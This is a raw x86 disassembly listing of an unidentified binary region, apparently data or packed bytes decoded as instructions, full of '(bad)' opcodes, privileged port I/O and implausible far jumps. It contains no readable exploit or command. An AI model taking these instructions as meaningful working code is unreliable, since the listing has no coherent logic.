  414e74:	jecxz  0x414e10
  414e76:	push   ss
  414e77:	mov    edi,0x62871152
  414e7c:	test   eax,0x86413b88
  414e81:	pop    es
  414e82:	pop    ss
  414e83:	cmp    edi,edx
  414e85:	pop    edi
  414e86:	ja     0x414e45
  414e88:	das    
  414e89:	cdq    
  414e8a:	clc    
  414e8b:	dec    edx
  414e8c:	xor    ch,BYTE PTR [edx-0x54]
  414e8f:	or     ah,BYTE PTR [edi-0x21b802b3]
  414e95:	mov    esp,0xbb6fd586
  414e9a:	enter  0x23ef,0x75
  414e9e:	out    0xd,eax
  414ea0:	mov    al,0xe8
  414ea2:	xor    esp,edx
  414ea4:	dec    esp
  414ea5:	mov    BYTE PTR [ecx-0x5f],dh
  414ea8:	mov    edi,0x18b26504
  414ead:	dec    ebp
  414eae:	xor    ebx,edi
  414eb0:	(bad)  
  414eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb2:	inc    ebx
  414eb3:	(bad)  
  414eb4:	jnp    0x414ee2
  414eb6:	shl    esi,0x56
  414eb9:	mov    ds:0xddae1441,al
  414ebe:	push   edx
  414ebf:	push   cs
  414ec0:	ja     0x414e82
  414ec2:	mov    ebx,0xf907cd38
  414ec7:	mov    dh,0x6f
  414ec9:	repnz xor ch,bh
  414ecc:	dec    ecx
  414ecd:	shl    BYTE PTR [ebp+0x7dc924e2],0xbc
  414ed4:	daa    
  414ed5:	ficomp DWORD PTR [ebp+0x54]
  414ed8:	jecxz  0x414ed1
  414eda:	cld    
  414edb:	mov    eax,0xf152d439
  414ee0:	fisubr WORD PTR [edi-0x1f6de3f0]
  414ee6:	(bad)  
  414ee7:	in     al,dx
  414ee8:	cmp    edx,DWORD PTR [esi-0x678de03e]
  414eee:	mov    dl,0x88
  414ef0:	hlt    
  414ef1:	popf   
  414ef2:	inc    edi
  414ef3:	popf   
  414ef4:	rcl    DWORD PTR [esi-0x29c22521],0xf7
  414efb:	mov    ecx,0x7a647d87
  414f00:	sub    dh,dh
  414f02:	push   edi
  414f03:	mov    dh,0xa5
  414f05:	xlat   BYTE PTR ds:[ebx]
  414f06:	xlat   BYTE PTR ds:[ebx]
  414f07:	fistp  QWORD PTR [eax]
  414f09:	mov    DWORD PTR [ebx],ebp
  414f0b:	push   0xcda9f372
  414f10:	sub    cl,ah
  414f12:	jmp    0xe3bc24cb
  414f17:	adc    DWORD PTR [edi],ebx
  414f19:	aam    0xae
  414f1b:	inc    eax
  414f1d:	mov    ch,0x0
  414f1f:	scas   al,BYTE PTR es:[edi]
  414f20:	or     bh,dl
  414f22:	mov    edi,0x73b4b2b8
  414f27:	outs   dx,BYTE PTR ds:[esi]
  414f28:	xor    al,0x97
  414f2a:	pop    edi
  414f2b:	addr16 inc edx
  414f2d:	or     DWORD PTR [esi+0x2d],edx
  414f30:	push   0xf6c5105a
  414f35:	mov    ah,0x5b
  414f37:	retf   0x9f41
  414f3a:	add    edi,DWORD PTR [eax+0x61]
  414f3d:	cmc    
  414f3e:	in     al,dx
  414f3f:	test   DWORD PTR [ebp+ebx*2-0x4c],ebp
  414f43:	cmc    
  414f44:	push   ebp
  414f45:	add    al,0x54
  414f47:	jge    0x414fa9
  414f49:	jmp    0x579b6b79
  414f4e:	push   eax
  414f4f:	sub    eax,0xb668a899
  414f54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f55:	mov    edx,DWORD PTR [ebx-0x77]
  414f58:	jmp    0xafa9:0x55c7256f
  414f5f:	sbb    al,ah
  414f61:	mov    edi,0x86a6d1d6
  414f66:	ret    0x551c
  414f69:	push   ecx
  414f6a:	sub    DWORD PTR [ecx-0x3f654104],ebp
  414f70:	cmp    edx,DWORD PTR [esi]
  414f72:	lahf   
  414f73:	push   edx
  414f74:	pop    ds
  414f75:	mov    DWORD PTR [edi],ecx
  414f77:	and    ecx,DWORD PTR [edx]
  414f79:	sub    esi,DWORD PTR [ebp+0x55]
  414f7c:	jns    0x414ff3
  414f7e:	pop    edx
  414f7f:	xchg   ebp,eax
  414f80:	mov    ebp,0x7fd6c2a3
  414f85:	fild   QWORD PTR [edi+0x7028d780]
  414f8b:	inc    ecx
  414f8c:	loopne 0x414f13
  414f8e:	lahf   
  414f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f90:	or     al,0xc7
  414f92:	mov    DWORD PTR [esi+eax*1],edi
  414f95:	in     eax,0x1
  414f97:	and    al,0xb1
  414f99:	addr16 int3 
  414f9b:	data16 sub al,0xfe
  414f9e:	push   ds
  414f9f:	push   ss
  414fa0:	fwait
  414fa1:	(bad)  
  414fa2:	out    0x50,al
  414fa4:	or     al,0xbe
  414fa6:	inc    ebp
  414fa7:	fidivr WORD PTR [ecx-0x69]
  414faa:	je     0x414f77
  414fac:	call   0x306588f9
  414fb1:	popa   
  414fb2:	out    dx,al
  414fb3:	dec    ecx
  414fb4:	ret    
  414fb5:	sub    eax,0xf9ab2cb6
  414fba:	or     BYTE PTR [edi+0x19],ah
  414fbd:	sub    al,0x4f
  414fbf:	inc    esp
  414fc1:	(bad)  
  414fc2:	dec    edi
  414fc3:	ret    
  414fc4:	xchg   ebp,eax
  414fc5:	inc    esi
  414fc6:	fsubr  DWORD PTR [esi+0x38abf90e]
  414fcc:	mov    cl,0x49
  414fce:	pop    esi
  414fcf:	in     eax,0x8f
  414fd1:	(bad)  
  414fd2:	mov    bl,0x30
  414fd4:	xchg   edi,eax
  414fd5:	jno    0x414f98
  414fd7:	adc    eax,0xb7e3df13
  414fdc:	(bad)
  414fe1:	scas   eax,DWORD PTR es:[edi]
  414fe2:	scas   al,BYTE PTR es:[edi]
  414fe3:	xor    ah,BYTE PTR [ebx-0x7d]
  414fe6:	sub    al,0xaa
  414fe8:	sbb    ebp,DWORD PTR [edi]
  414fea:	test   eax,0x3a54ff68
  414fef:	cmp    BYTE PTR [esi],0x70
  414ff2:	mov    es,WORD PTR [ebx]
  414ff4:	ja     0x414f9b
  414ff6:	sahf   
  414ff7:	in     al,dx
  414ff8:	push   ecx
  414ff9:	std    
  414ffa:	adc    esi,esp
  414ffc:	out    dx,eax
  414ffd:	sub    BYTE PTR [esi+edx*1-0x60],al
  415001:	jnp    0x414f8c
  415003:	xor    cl,0x8a
  415006:	xchg   edi,eax
  415007:	loopne 0x414fa1
  415009:	sub    esi,ebx
  41500b:	pop    ebp
  41500c:	outs   dx,DWORD PTR ds:[esi]
  41500d:	stc    
  41500e:	and    BYTE PTR [esi+0x358e9a77],0x73
  415015:	cbw    
  415017:	mov    edi,0x4a6efbe5
  41501c:	adc    edx,0x7a
  41501f:	pop    esi
  415020:	out    dx,eax
  415021:	pushf  
  415022:	ss fcmovne st,st(6)
  415025:	lods   eax,DWORD PTR ds:[esi]
  415026:	loopne 0x415051
  415028:	dec    eax
  415029:	push   esp
  41502a:	call   0x69ef:0x44336ef1
  415031:	pusha  
  415032:	aam    0xba
  415034:	adc    DWORD PTR [edx],eax
  415036:	fcmovu st,st(7)
  415038:	inc    esp
  415039:	push   edi
  41503a:	fmul   st(7),st
  41503c:	inc    edx
  41503d:	jge    0x415025
  41503f:	aad    0xc4
  415041:	push   ecx
  415042:	inc    esi
  415043:	adc    DWORD PTR [edi+0x1d],edi
  415046:	xchg   ecx,eax
  415047:	push   ebp
  415048:	pop    esi
  415049:	nop
  41504a:	lahf   
  41504b:	adc    DWORD PTR [eax+eax*4+0xe689182],ecx
  415052:	(bad)  
  415055:	sub    edi,esp
  415057:	xchg   ebp,eax
  415058:	jae    0x415098
  41505a:	inc    ebp
  41505b:	lahf   
  41505c:	mov    edi,0x90c1e9da
  415061:	lea    eax,[esi+0x1]
  415064:	xor    dl,BYTE PTR [esi+0x1d]
  415067:	dec    DWORD PTR [edx]
  415069:	inc    edi
  41506a:	enter  0xb775,0xe4
  41506e:	inc    esp
  41506f:	inc    ebp
  415070:	call   0x6a3d:0x4e8aa3a3
  415077:	xor    eax,ebx
  415079:	(bad)  
  41507a:	mov    ebp,0x1013143b
  41507f:	ins    BYTE PTR es:[edi],dx
  415080:	cwde   
  415081:	jae    0x4150d0
  415083:	loop   0x41502e
  415085:	xor    bh,bh
  415087:	test   edi,esi
  415089:	inc    edx
  41508a:	arpl   WORD PTR [ecx+0x571a69a9],cx
  415090:	fsubr  QWORD PTR [esi-0x4]
  415093:	inc    esp
  415094:	dec    edi
  415095:	mov    cs,WORD PTR [ebx+eax*8-0x33b83567]
  41509c:	ins    DWORD PTR es:[edi],dx
  41509d:	dec    eax
  41509e:	in     al,0xb2
  4150a0:	arpl   WORD PTR [ebp+0x35f8443f],bp
  4150a6:	mov    cl,0x57
  4150a8:	int3   
  4150a9:	das    
  4150aa:	inc    eax
  4150ab:	jle    0x415099
  4150ad:	mov    eax,DWORD PTR [eax]
	...
  41527f:	add    BYTE PTR [eax],al
  415281:	add    BYTE PTR [ebp-0x7f],bl
  415284:	sub    dl,0xde
  415287:	jmp    0x415306
  415289:	mov    bh,0xe6
  41528b:	or     BYTE PTR [eax-0x2e],0xb7
  41528f:	and    ebx,DWORD PTR [esi-0x27]
  415292:	ret    
  415293:	pop    edx
  415294:	add    DWORD PTR [eax],eax
  415296:	and    al,BYTE PTR [edi]
  415298:	add    BYTE PTR [eax],al
  41529a:	dec    ecx
  41529b:	adc    ch,dh
  41529d:	aas    
  41529e:	jge    0x415275
  4152a0:	scas   al,BYTE PTR es:[edi]
  4152a1:	std    
  4152a2:	jno    0x415297
  4152a4:	jecxz  0x415295
  4152a6:	sbb    BYTE PTR [ecx+ebp*1-0x6e],bh
  4152aa:	mov    ebp,0x409f408c
  4152af:	jae    0x415281
  4152b1:	outs   dx,BYTE PTR ds:[esi]
  4152b2:	test   DWORD PTR [ebx+0x40],esi
  4152b5:	sbb    BYTE PTR [edi-0x9],0xd7
  4152b9:	inc    esi
  4152ba:	sub    al,0x52
  4152bc:	call   0xd603:0x8e636f3c
  4152c3:	fbld   TBYTE PTR [esi]
  4152c5:	adc    ebp,ecx
  4152c7:	lahf   
  4152c8:	loop   0x41532d
  4152ca:	ss jb  0x415292
  4152cd:	out    0xa9,al
  4152cf:	inc    esp
  4152d0:	cdq    
  4152d1:	shr    DWORD PTR [ebp+0x18],cl
  4152d4:	mov    dl,0x3b
  4152d6:	push   esp
  4152d7:	cmp    DWORD PTR [edi],edi
  4152d9:	cmp    eax,0x37b01028
  4152de:	mov    ebx,0x13e0010d
  4152e3:	pop    ecx
  4152e4:	cdq    
  4152e5:	rol    DWORD PTR [edx],cl
  4152e7:	int3   
  4152e8:	adc    BYTE PTR [eax],al
  4152ea:	cdq    
  4152eb:	rol    dl,1
  4152ed:	lods   eax,DWORD PTR ds:[esi]
  4152ee:	adc    BYTE PTR [edx+0x74e1f235],ah
  4152f4:	inc    esi
  4152f5:	in     al,dx
  4152f6:	sub    DWORD PTR [edi],esi
  4152f8:	and    al,0x4d
  4152fa:	inc    eax
  4152fb:	retf   
  4152fc:	cmp    cl,BYTE PTR [esp+eiz*4]
  4152ff:	xchg   esi,eax
  415300:	push   cs
  415301:	sub    DWORD PTR [esi+0x2565b25e],0x20f1e89b
  41530b:	into   
  41530c:	xor    ebp,DWORD PTR [esi-0x3dcd0218]
  415312:	sbb    BYTE PTR [ebp-0x5e8ba7fc],bl
  415318:	shl    DWORD PTR [esi+0x7e],cl
  41531b:	jmp    0x5866:0xe1bfc29f
  415322:	sbb    eax,0xf32ba660
  415327:	int3   
  415328:	inc    ecx
  415329:	and    DWORD PTR [eax],ebx
  41532b:	sub    DWORD PTR [esi+0x4c],esi
  41532e:	mov    esi,0x95183eaf
  415333:	fdivr  DWORD PTR [ebx-0x30]
  415336:	dec    ecx
  415337:	in     al,0x1b
  415339:	in     eax,0x8e
  41533b:	adc    BYTE PTR [edx-0xc],0xc4
  41533f:	sti    
  415340:	jnp    0x415338
  415342:	add    BYTE PTR [ebp+0x29],bh
  415345:	(bad)  
  415346:	cmp    eax,0x7a4de57
  41534b:	dec    esp
  41534c:	loop   0x415313
  41534e:	jb     0x4153a4
  415350:	and    ecx,DWORD PTR [edx-0x38]
  415353:	pop    ecx
  415354:	dec    edi
  415355:	nop
  415356:	jbe    0x4152ff
  415358:	adc    BYTE PTR [ebx+0x57fb2e9b],ah
  41535e:	popf   
  41535f:	outs   dx,BYTE PTR ds:[esi]
  415360:	(bad)  
  415361:	(bad)  
  415362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415363:	int    0x2d
  415365:	jno    0x4153cf
  415367:	adc    ebx,DWORD PTR [ebp-0x4d7fa9b8]
  41536d:	dec    ebp
  41536e:	cmp    di,WORD PTR [edi+esi*1+0x6a8cca56]
  415376:	sbb    BYTE PTR [ecx-0x49744f8e],dh
  41537c:	hlt    
  41537d:	cmp    eax,0xf7822200
  415382:	mov    DWORD PTR [edi],edi
  415384:	fld    QWORD PTR [esi+0x8]
  415387:	xor    ch,BYTE PTR [ecx]
  415389:	jge    0x4153af
  41538b:	cmp    BYTE PTR [edi+0x3f],dl
  41538e:	pop    eax
  41538f:	addr16 in al,0x9c
  415392:	pop    ss
  415393:	or     ebx,DWORD PTR es:[edx-0x1c3cab79]
  41539a:	out    dx,al
  41539b:	not    BYTE PTR [edx]
  41539d:	xor    cl,BYTE PTR [ecx]
  41539f:	stos   DWORD PTR es:[edi],eax
  4153a0:	pmulhw mm3,QWORD PTR [ebp+0x38]
  4153a4:	nop
  4153a5:	xchg   edi,eax
  4153a6:	adc    ecx,edi
  4153a8:	outs   dx,DWORD PTR ds:[esi]
  4153a9:	ror    BYTE PTR [ecx+0x6c988c23],1
  4153af:	jnp    0x415346
  4153b1:	push   esp
  4153b2:	fadd   DWORD PTR [ebp-0x11]
  4153b5:	pop    ebp
  4153b6:	xchg   ebx,eax
  4153b7:	fmul   DWORD PTR [ecx]
  4153b9:	pop    edi
  4153ba:	lea    esp,[edi+0x61]
  4153bd:	inc    ebx
  4153be:	imul   ebp,ecx,0x2b
  4153c1:	push   ecx
  4153c2:	fcmovnu st,st(2)
  4153c4:	add    al,0x42
  4153c6:	cmp    BYTE PTR [ebp-0x76],al
  4153c9:	cmp    DWORD PTR [edx-0x33602989],ebx
  4153cf:	(bad)  
  4153d0:	xor    eax,0x35df83c1
  4153d5:	cmp    BYTE PTR [ebx+0x5091f66e],cl
  4153db:	push   ebx
  4153dc:	pushf  
  4153dd:	mov    edi,0xcca89def
  4153e2:	data16 add dh,BYTE PTR [ebx+0x2]
  4153e6:	loop   0x41539d
  4153e8:	pop    es
  4153e9:	xchg   esp,eax
  4153ea:	sbb    BYTE PTR [eax],dl
  4153ec:	ja     0x415456
  4153ee:	dec    edi
  4153ef:	mov    eax,eax
  4153f1:	cmp    BYTE PTR [esi+0x497369a6],al
  4153f7:	leave  
  4153f8:	push   edi
  4153f9:	inc    edi
  4153fa:	dec    ebx
  4153fb:	ins    BYTE PTR es:[edi],dx
  4153fc:	(bad)  
  4153fd:	push   esp
  4153fe:	test   DWORD PTR [esi-0x57],0x365144d7
  415405:	call   0xbfb7:0x6f512e2f
  41540c:	inc    edi
  41540d:	push   cs
  41540e:	lahf   
  41540f:	and    DWORD PTR [ebp+0x71],ecx
  415412:	or     BYTE PTR [eax+eiz*2],al
  415415:	mov    al,0xd3
  415417:	ins    BYTE PTR es:[edi],dx
  415418:	cmp    BYTE PTR [esi-0x5d1709ee],bl
  41541e:	cs jmp 0xd4d96acd
  415424:	sbb    BYTE PTR [edx-0x58],dl
  415427:	loope  0x4153e7
  415429:	(bad)  
  41542a:	fsub   QWORD PTR [ebx+esi*8+0x22]
  41542e:	cs cwde 
  415430:	push   eax
  415431:	into   
  415432:	fbstp  TBYTE PTR [edi]
  415434:	ror    BYTE PTR [edx],0xb8
  415437:	scas   eax,DWORD PTR es:[edi]
  415438:	in     al,0xd1
  41543a:	sub    DWORD PTR [ebx-0x4ca09690],esi
  415440:	adc    eax,0xffffffbd
  415443:	mov    edx,0x686b8855
  415448:	mov    al,0x66
  41544a:	shl    DWORD PTR [ecx-0x3165a200],0xa5
  415451:	repz popa 
  415453:	pop    ss
  415454:	outs   dx,DWORD PTR ds:[esi]
  415455:	and    al,0x6c
  415457:	leave  
  415458:	dec    ebx
  415459:	int    0x5e
  41545b:	out    dx,eax
  41545c:	and    BYTE PTR [ebx+0x5a638b5e],dl
  415462:	xlat   BYTE PTR ds:[ebx]
  415463:	out    0xd3,eax
  415465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415466:	inc    edi
  415467:	test   DWORD PTR [esi+0x3c6269dd],ecx
  41546d:	inc    ecx
  41546e:	lods   eax,DWORD PTR cs:[esi]
  415470:	(bad)  
  415472:	rol    DWORD PTR [ecx],0x69
  415475:	mov    esi,0xe60a386f
  41547a:	in     al,0x8e
  41547c:	or     dl,dh
  41547e:	scas   al,BYTE PTR es:[edi]
  41547f:	lahf   
  415480:	xor    ecx,DWORD PTR [esi+eax*2]
  415483:	push   eax
  415484:	push   cs
  415485:	and    dh,ah
  415487:	adc    al,0xf5
  415489:	cmp    dl,BYTE PTR [ebx+0x38]
  41548c:	fnstcw WORD PTR fs:[eax+0x57]
  415490:	loopne 0x415419
  415492:	push   ebp
  415493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415494:	or     eax,0x805cddff
  415499:	pop    ecx
  41549a:	sbb    bl,BYTE PTR [ebx-0x4f2a3f6d]
  4154a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154a1:	loope  0x415465
  4154a3:	and    al,0x23
  4154a5:	push   0xffffffbd
  4154a7:	pop    esp
  4154a8:	sub    eax,DWORD PTR [esi+0x2]
  4154ab:	cwde   
  4154ac:	cs ins BYTE PTR es:[edi],dx
  4154ae:	enter  0xbe17,0xa8
  4154b2:	jae    0x415482
  4154b4:	mov    bl,0xca
  4154b6:	outs   dx,DWORD PTR ds:[esi]
  4154b7:	or     eax,0x62751e9f
  4154bd:	(bad)  
  4154be:	aaa    
  4154bf:	jmp    0x4c86:0x78600a63
  4154c6:	mov    dh,BYTE PTR [di+0x3d]
  4154ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154cb:	sub    al,BYTE PTR [esi-0x5871613e]
  4154d1:	jo     0x41545f
  4154d3:	adc    eax,0x20bcbd4c
  4154d8:	pop    edx
  4154d9:	(bad)  [edx+esi*8-0x3d]
  4154dd:	cmp    BYTE PTR [ebx],dl
  4154df:	sbb    DWORD PTR [ecx],ebp
  4154e1:	push   ebx
  4154e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154e3:	pop    ebx
  4154e4:	mov    ah,0x6e
  4154e6:	hlt    
  4154e7:	push   ebp
  4154e8:	cmp    edx,DWORD PTR [ecx-0x6437b0ea]
  4154ee:	mov    ebp,esp
  4154f0:	adc    eax,0x3ab244a4
  4154f5:	jg     0x4154a1
  4154f7:	out    0xfe,eax
  4154f9:	stos   BYTE PTR es:[edi],al
  4154fa:	and    eax,0x6a8f9bc6
  4154ff:	scas   al,BYTE PTR es:[edi]
  415500:	popa   
  415501:	out    dx,al
  415502:	lock jle 0x415488
  415505:	push   edi
  415506:	jb     0x415520
  415508:	mov    WORD PTR [ebp-0x6e9e34e2],?
  41550e:	mov    cl,0x80
  415510:	iret   
  415511:	ins    DWORD PTR es:[edi],dx
  415512:	push   esp
  415513:	clc    
  415514:	ss pop ds
  415516:	out    0xef,eax
  415518:	bndstx [ecx-0x72],(bad)
  41551c:	cmp    ah,BYTE PTR [ecx+0x38]
  41551f:	cmp    DWORD PTR [edx],0xc013386
  415525:	sub    DWORD PTR [esi+0x1db137a6],0xd
  41552c:	sbb    al,BYTE PTR ds:0x27fadcc2
  415532:	sbb    edi,DWORD PTR [edi+0x299af21e]
  415538:	fs sub eax,0xe916688a
  41553e:	les    edi,FWORD PTR [ebx-0x33]
  415541:	outs   dx,DWORD PTR ds:[esi]
  415542:	jmp    DWORD PTR [ecx-0x621d861a]
  415548:	mov    al,BYTE PTR [esi-0x2f]
  41554b:	js     0x415553
  41554d:	sti    
  41554e:	ds test eax,0x40db1741
  415554:	fwait
  415555:	dec    edi
  415556:	mov    eax,ds:0xe6b0b27f
  41555b:	jmp    FWORD PTR [ebx]
  41555d:	out    dx,eax
  41555e:	div    eax
  415560:	pop    es
  415561:	daa    
  415562:	int3   
  415563:	data16 not BYTE PTR ds:0xed2774a1
  41556a:	popa   
  41556b:	mov    ah,0xf
  41556d:	and    DWORD PTR [edx-0x2e],0x33
  415571:	mov    esi,0x143be1c5
  415576:	(bad)  
  415577:	jmp    0x145c2e79
  41557c:	pop    ss
  41557d:	bound  eax,QWORD PTR [ecx]
  41557f:	sub    BYTE PTR [ecx+ebx*4],al
  415582:	mov    ebx,0xda1ec095
  415587:	mov    bl,0xb4
  415589:	inc    ebx
  41558a:	into   
  41558b:	retf   
  41558c:	jg     0x415529
  41558e:	aam    0xaa
  415590:	out    dx,eax
  415591:	cmc    
  415592:	mov    bh,0xb2
  415594:	and    esi,0x52f8b11e
  41559a:	dec    esp
  41559b:	ja     0x41557c
  41559d:	popa   
  41559e:	add    al,0x99
  4155a0:	push   edx
  4155a1:	xor    al,BYTE PTR es:[eax+0x56ad8c7d]
  4155a8:	push   edi
  4155a9:	jge    0x415569
  4155ab:	in     al,dx
  4155ac:	jge    0x4155de
  4155ae:	mov    ebx,DWORD PTR ds:0x20219e77
  4155b4:	xlat   BYTE PTR ds:[ebx]
  4155b5:	add    eax,0xef692aa8
  4155ba:	lahf   
  4155bb:	pusha  
  4155bc:	and    edx,DWORD PTR [ebp-0x2e8f99ea]
  4155c2:	cmp    eax,0x34a88b5f
  4155c7:	sub    DWORD PTR [ebx+0x42],esp
  4155ca:	push   esp
  4155cb:	mov    bh,0x54
  4155cd:	lods   eax,DWORD PTR ds:[esi]
  4155ce:	xor    al,BYTE PTR cs:[ecx]
  4155d1:	xor    BYTE PTR [ecx-0x8],0x33
  4155d5:	call   0xa60d:0x18d22978
  4155dc:	or     DWORD PTR [ecx-0x691fca46],0xffffffe2
  4155e3:	push   es
  4155e4:	(bad)  
  4155e5:	fld    TBYTE PTR [ebx+0x6c]
  4155e8:	jmp    0x415655
  4155ea:	mov    gs,WORD PTR [edx]
  4155ec:	out    0x55,eax
  4155ee:	popa   
  4155ef:	rcl    eax,0x3c
  4155f2:	mov    ds:0xd317e464,eax
  4155f7:	and    BYTE PTR [edi+0x51],al
  4155fa:	lods   eax,DWORD PTR ds:[esi]
  4155fb:	pop    ebp
  4155fc:	fwait
  4155fd:	and    edi,DWORD PTR [eax]
  4155ff:	(bad)  
  415600:	sbb    ebp,DWORD PTR [eax+eax*8]
  415603:	pop    es
  415604:	xor    DWORD PTR [esi+0x4ad5c6d2],ecx
  41560a:	mov    eax,0xe60e599f
  41560f:	and    dh,0xb7
  415612:	push   esi
  415613:	es adc ah,dh
  415616:	add    eax,0x5ef648cb
  41561b:	aaa    
  41561c:	(bad)  
  41561d:	jmp    0xe40b:0xa21b2ad5
  415624:	sub    esp,esp
  415626:	adc    al,BYTE PTR [edx]
  415628:	push   ss
  415629:	mov    BYTE PTR [ebx],dl
  41562b:	push   edi
  41562c:	xor    eax,0x28a5d3d3
  415631:	fdiv   QWORD PTR [edi+0x2eccde60]
  415637:	out    dx,eax
  415638:	adc    eax,0x77f55c7c
  41563d:	push   esp
  41563e:	mov    ebp,ebp
  415640:	xor    BYTE PTR [esi+0x14],dh
  415643:	dec    ecx
  415644:	jno    0x4155fb
  415646:	ret    0xfd8f
  415649:	and    al,0x29
  41564b:	ror    DWORD PTR [edi+0x44],0x1e
  41564f:	jl     0x4156ac
  415651:	loopne 0x41569a
  415653:	xor    ebx,0x1f
  415656:	adc    eax,DWORD PTR [ecx+0x77]
  415659:	cmp    al,0xcd
  41565b:	sbb    eax,0xf9cfb00a
  415660:	add    al,0xa5
  415662:	rcr    BYTE PTR [eax-0x3add691b],0x5d
  415669:	adc    al,0x8b
  41566b:	jns    0x415631
  41566d:	outs   dx,DWORD PTR ds:[esi]
  41566e:	sub    al,0xbe
  415670:	fld    TBYTE PTR [ecx]
  415672:	sbb    esi,DWORD PTR [ebx-0x4b]
  415675:	mov    dl,ch
  415677:	fnstsw WORD PTR [edx+0x7291aa12]
  41567d:	and    DWORD PTR ss:[esi+0x0],ecx
  415681:	xchg   esp,eax
  415682:	add    ch,dh
  415684:	sbb    ah,BYTE PTR [edi-0x67]
  415687:	push   ds
  415688:	out    dx,al
  415689:	xchg   BYTE PTR [ebx+0x5c],ch
  41568c:	mov    esi,es
  41568e:	retf   
  41568f:	cmp    DWORD PTR [edi],esi
  415691:	push   ds
  415692:	jmp    0x415705
  415694:	aas    
  415695:	mov    fs:0xcc1782b7,eax
  41569b:	fsub   st(7),st
  41569d:	vcvttps2dq ymm5,YMMWORD PTR [ebx]
  4156a1:	xchg   esp,eax
  4156a2:	xchg   ecx,eax
  4156a3:	ret    
  4156a4:	test   DWORD PTR [esp+eiz*4],edx
  4156a7:	and    al,0x17
  4156a9:	inc    ecx
  4156aa:	xchg   esp,eax
  4156ab:	imul   bh
  4156ad:	adc    esp,esp
  4156af:	push   esp
  4156b0:	retf   
  4156b1:	add    ecx,eax
  4156b3:	pop    ds
  4156b4:	mov    ebp,0x15b15721
  4156b9:	stc    
  4156ba:	jb     0x415685
  4156bc:	or     ah,BYTE PTR [eax-0x76afaa46]
  4156c2:	add    DWORD PTR [edi+edi*1-0x642bbe84],esi
  4156c9:	add    al,0xe4
  4156cb:	sub    eax,DWORD PTR [ebp-0x5]
  4156ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156cf:	inc    ebx
  4156d0:	call   0x6297eb2a
  4156d5:	push   edx
  4156d6:	aad    0xee
  4156d8:	push   esi
  4156d9:	pop    ebp
  4156da:	fcomp  QWORD PTR [edi+0x7dc4d1bb]
  4156e0:	xchg   edi,eax
  4156e1:	mov    dh,0xfc
  4156e3:	or     eax,DWORD PTR [esi+0xb]
  4156e6:	aam    0x56
  4156e8:	sub    eax,0x2296270a
  4156ed:	jmp    0xf543bc4d
  4156f2:	pop    esp
  4156f3:	shl    DWORD PTR [ecx-0x4b02bd7f],cl
  4156f9:	and    al,0x36
  4156fb:	sbb    BYTE PTR [esi],bh
  4156fd:	cld    
  4156fe:	xchg   DWORD PTR [edx-0xcfca63],ecx
  415704:	sbb    ebx,DWORD PTR [edx-0x5b2305fe]
  41570a:	xlat   BYTE PTR ds:[ebx]
  41570b:	push   ecx
  41570c:	or     edi,ebx
  41570e:	mov    edx,0xff2efafc
  415713:	(bad)  
  415714:	shl    BYTE PTR [esi],cl
  415716:	push   edx
  415717:	push   cs
  415718:	jge    0x415765
  41571a:	sbb    al,0x63
  41571c:	imul   esi,DWORD PTR [edx+0x13],0xffffffc4
  415720:	dec    esp
  415721:	rcr    DWORD PTR ds:0xea0418a7,1
  415727:	add    al,0xd1
  415729:	sbb    esp,esi
  41572b:	outs   dx,DWORD PTR ds:[esi]
  41572c:	pop    ss
  41572d:	ins    DWORD PTR es:[edi],dx
  41572e:	je     0x415797
  415730:	scas   al,BYTE PTR es:[edi]
  415731:	inc    ecx
  415732:	fsubr  QWORD PTR [ecx]
  415734:	or     ebp,ecx
  415736:	pop    ebx
  415737:	xor    ah,BYTE PTR [ebx+0x2af8c7b2]
  41573d:	mov    DWORD PTR [edx+0x42],eax
  415740:	sar    DWORD PTR [ecx-0x79],cl
  415743:	test   BYTE PTR [ebp-0x135cdb4d],bh
  415749:	retf   
  41574a:	js     0x415728
  41574c:	aad    0x62
  41574e:	fwait
  41574f:	pop    ebx
  415750:	shl    DWORD PTR [ecx+0x418d721d],cl
  415756:	sub    BYTE PTR [ebx-0x75],0xb1
  41575a:	inc    edi
  41575b:	mov    bh,BYTE PTR [eax+0x57]
  41575e:	in     eax,0x6c
  415760:	ins    DWORD PTR es:[edi],dx
  415761:	pushf  
  415762:	outs   dx,DWORD PTR ds:[esi]
  415763:	daa    
  415764:	cmp    eax,0x199531cd
  415769:	ret    
  41576a:	mov    ebx,0xd2dde2f3
  41576f:	adc    eax,0x62f8a38
  415774:	ja     0x4157db
  415776:	cmp    DWORD PTR [edi-0x30ae3e0],ecx
  41577c:	inc    esp
  41577d:	xor    DWORD PTR [ebx],ebp
  41577f:	js     0x415774
  415781:	mov    esi,0x67237b16
  415786:	add    ebx,DWORD PTR [esp+ebp*8-0x10]
  41578a:	adc    DWORD PTR [esi+0x7a],edi
  41578d:	mov    eax,0x215ae84
  415792:	jge    0x41578a
  415794:	adc    al,0xac
  415796:	enter  0x3166,0xa5
  41579a:	inc    esp
  41579b:	mov    bh,0xdd
  41579d:	hlt    
  41579e:	add    al,0x84
  4157a0:	(bad)
  4157a3:	adc    BYTE PTR [eax+0x54],ch
  4157a6:	adc    BYTE PTR [ebx],0x9f
  4157a9:	(bad)  
  4157aa:	(bad)  
  4157ab:	jp     0x415730
  4157ad:	xchg   esi,eax
  4157ae:	xchg   esi,eax
  4157af:	dec    ecx
  4157b0:	add    BYTE PTR [eax-0x63],ah
  4157b3:	fs jns 0x415782
  4157b6:	pop    es
  4157b7:	stos   BYTE PTR es:[edi],al
  4157b8:	in     al,0x10
  4157ba:	(bad)  
  4157bb:	(bad)  
  4157bc:	xor    dh,ah
  4157be:	inc    ebp
  4157bf:	stc    
  4157c0:	test   al,0x1e
  4157c2:	jo     0x41578b
  4157c4:	loop   0x415825
  4157c6:	dec    esi
  4157c7:	into   
  4157c8:	aad    0x44
  4157ca:	cli    
  4157cb:	loop   0x415813
  4157cd:	adc    al,0xa9
  4157cf:	neg    edi
  4157d1:	add    DWORD PTR [ebp-0xd56f640],ebx
  4157d7:	mov    ch,0xdc
  4157d9:	cdq    
